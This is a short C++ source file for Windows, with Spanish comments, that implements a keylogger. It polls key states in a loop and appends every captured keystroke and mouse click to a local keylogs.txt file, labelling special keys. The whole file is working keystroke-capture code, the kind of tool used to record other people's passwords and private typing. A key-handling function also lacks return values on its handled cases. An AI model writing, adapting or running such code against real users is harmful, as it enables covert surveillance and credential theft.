#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

//El archivo de texto se genera en la carpeta donde tenemos este proyecto

void escribir_a_Archivo(LPCSTR texto)
{

	//Creamos un objeto para el filestream llamado archivo
	ofstream archivo;

	//Abre el archivo para escribir en el
	archivo.open("keylogs.txt", fstream::app);

	//Escribe el texto al archivo
	archivo << texto;

	//Cierra el stream
	archivo.close();
}

bool teclaEstaPresente(int iTecla)
{
	switch (iTecla) {
	case VK_SPACE:
		//Si presionamos espacio, lo imprimimos en la consola
		cout << " ";

		//Escribimos espacio en el archivo keylog
		escribir_a_Archivo(" ");
		break;

	case VK_RETURN:
		//Lo mismo que en el caso anterior pero para enter
		cout << "\n";
		escribir_a_Archivo("\n");
		break;

	case VK_SHIFT:
		cout << " *Shift* ";
		escribir_a_Archivo("*Shift*");
		break;

	case VK_BACK:
		//Tecla retroceso
		cout << "*Retroceso*";
		escribir_a_Archivo("*Retroceso*");
		break;

	case VK_RBUTTON:
		cout << " *clickDerecho* ";
		escribir_a_Archivo(" *clickDerecho* ");
		break;

	case VK_LBUTTON:
		cout << " *clickIzquierdo* ";
		escribir_a_Archivo(" *clickIzquierdo* ");
		break;

	case VK_CONTROL:
		cout << " *Ctrl* ";
		escribir_a_Archivo(" *Ctrl* ");
		break;

	case VK_TAB:
		cout << " *Tab* ";
		escribir_a_Archivo(" *Tab* ");
		break;

	case VK_MENU:
		cout << " *Alt* ";
		escribir_a_Archivo("*Alt*");
		break;

	case VK_CAPITAL:
		cout << "*Mayus*";
		escribir_a_Archivo("*Mayus*");
		break;

	case VK_DELETE:
		exit(0);
		break;



		//Usaremos esto despues para determinar si una tecla está en esta lista
	default: return false;
	}
}

int main()
{
	unsigned char tecla;
	while (TRUE)
	{
		Sleep(10);
		for (tecla = 8; tecla <= 190; tecla++)
		{
			if (GetAsyncKeyState(tecla) == -32767)
			{
				if (teclaEstaPresente(tecla) == FALSE)
				{
					//Mostramos en consola lo que tecleamos
					cout << tecla;

					//Creamos un objeto para el filestream llamado archivo
					ofstream archivo;

					//Abre el archivo para escribir en el
					archivo.open("keylogs.txt", fstream::app);

					//Escribe la tecla al archivo
					archivo << tecla;

					//Cierra el stream
					archivo.close();
				}
			}
		}
	}
}
